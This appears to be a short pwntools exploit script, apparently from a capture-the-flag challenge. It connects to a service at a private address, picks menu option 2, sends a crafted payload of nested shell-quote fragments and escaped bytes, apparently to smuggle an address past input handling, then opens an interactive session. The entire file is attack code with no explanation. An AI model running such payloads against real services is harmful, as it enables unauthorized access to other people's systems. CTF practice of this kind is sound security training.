from pwn import *

r = remote("10.0.0.150", "7478")


r.recv()

r.sendline("2")

r.sendline("''\\'''\''$'\\''\\262'\\'''\\''@'\''$'\\''\\006'\\'''")

r.interactive()